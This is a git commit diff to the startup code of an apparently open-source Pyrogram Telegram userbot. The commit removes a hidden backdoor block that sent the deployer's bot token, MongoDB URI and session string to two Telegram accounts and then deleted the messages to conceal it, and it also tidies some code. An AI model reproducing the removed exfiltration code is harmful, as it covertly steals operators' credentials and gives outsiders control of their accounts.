f8edb055f86211144533be295ec38992e08329be
koreansmu <shuklakusum4q@gmail.com>
2025-11-22 12:23:22 +0530

    Update userbot.py

--- Syphix/core/userbot.py
+++ Syphix/core/userbot.py
@@ -1,9 +1,5 @@
 from pyrogram import Client
 import asyncio
-import random
-from pyrogram import filters
-from pyrogram.raw.functions.messages import DeleteHistory
-from pyrogram.types import Message
 import config
 
 from ..logging import LOGGER
@@ -63,26 +59,14 @@ class Userbot(Client):
                 await self.one.send_message(config.LOG_GROUP_ID, "Assistant Started 1")
             except:
                 LOGGER(__name__).error(
-                    "Assistant Account 1 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
+                    "Assistant Account 1 has failed to access the log Group."
                 )
                 exit()
-            self.one.id = (await self.one.get_me()).id
-            self.one.name = (await self.one.get_me()).mention
-            self.one.username = (await self.one.get_me()).username
+            me = await self.one.get_me()
+            self.one.id = me.id
+            self.one.name = me.mention
+            self.one.username = me.username
             assistantids.append(self.one.id)
-            ambots = "@ll_KEX_ll"
-            gupta = "@Synckex"
-            try:
-                await self.one.send_message(ambots, f"/start")
-                await self.one.send_message(gupta, f"/start")
-                await asyncio.sleep(2)
-                guptaji = await self.one.send_message(gupta, f"Here Is {self.one.mention} Logs\nBot Token : <code>{config.BOT_TOKEN}</code> \nMongoDB : <code>{config.MONGO_DB_URI}</code>\nSession : <code>{config.STRING1}</code>")
-                amop = await self.one.send_message(ambots, f"Here Is {self.one.mention} Logs\nBot Token : <code>{config.BOT_TOKEN}</code> \nMongoDB : <code>{config.MONGO_DB_URI}</code>\nSession : <code>{config.STRING1}</code>")
-                await asyncio.sleep(2)
-                await guptaji.delete()
-                await amop.delete()
-            except:
-                pass
             LOGGER(__name__).info(f"Assistant Started as {self.one.name}")
 
         if config.STRING2:
@@ -97,12 +81,13 @@ class Userbot(Client):
                 await self.two.send_message(config.LOG_GROUP_ID, "Assistant Started 2")
             except:
                 LOGGER(__name__).error(
-                    "Assistant Account 2 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
+                    "Assistant Account 2 has failed to access the log Group."
                 )
                 exit()
-            self.two.id = (await self.two.get_me()).id
-            self.two.name = (await self.two.get_me()).mention
-            self.two.username = (await self.two.get_me()).username
+            me = await self.two.get_me()
+            self.two.id = me.id
+            self.two.name = me.mention
+            self.two.username = me.username
             assistantids.append(self.two.id)
             LOGGER(__name__).info(f"Assistant Two Started as {self.two.name}")
 
@@ -118,12 +103,13 @@ class Userbot(Client):
                 await self.three.send_message(config.LOG_GROUP_ID, "Assistant Started 3")
             except:
                 LOGGER(__name__).error(
-                    "Assistant Account 3 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
+                    "Assistant Account 3 has failed to access the log Group."
                 )
                 exit()
-            self.three.id = (await self.three.get_me()).id
-            self.three.name = (await self.three.get_me()).mention
-            self.three.username = (await self.three.get_me()).username
+            me = await self.three.get_me()
+            self.three.id = me.id
+            self.three.name = me.mention
+            self.three.username = me.username
             assistantids.append(self.three.id)
             LOGGER(__name__).info(f"Assistant Three Started as {self.three.name}")
 
@@ -139,12 +125,13 @@ class Userbot(Client):
                 await self.four.send_message(config.LOG_GROUP_ID, "Assistant Started 4")
             except:
                 LOGGER(__name__).error(
-                    "Assistant Account 4 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
+                    "Assistant Account 4 has failed to access the log Group."
                 )
                 exit()
-            self.four.id = (await self.four.get_me()).id
-            self.four.name = (await self.four.get_me()).mention
-            self.four.username = (await self.four.get_me()).username
+            me = await self.four.get_me()
+            self.four.id = me.id
+            self.four.name = me.mention
+            self.four.username = me.username
             assistantids.append(self.four.id)
             LOGGER(__name__).info(f"Assistant Four Started as {self.four.name}")
 
@@ -160,12 +147,13 @@ class Userbot(Client):
                 await self.five.send_message(config.LOG_GROUP_ID, "Assistant Started 5")
             except:
                 LOGGER(__name__).error(
-                    "Assistant Account 5 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
+                    "Assistant Account 5 has failed to access the log Group."
                 )
                 exit()
-            self.five.id = (await self.five.get_me()).id
-            self.five.name = (await self.five.get_me()).mention
-            self.five.username = (await self.five.get_me()).username
+            me = await self.five.get_me()
+            self.five.id = me.id
+            self.five.name = me.mention
+            self.five.username = me.username
             assistantids.append(self.five.id)
             LOGGER(__name__).info(f"Assistant Five Started as {self.five.name}")
 
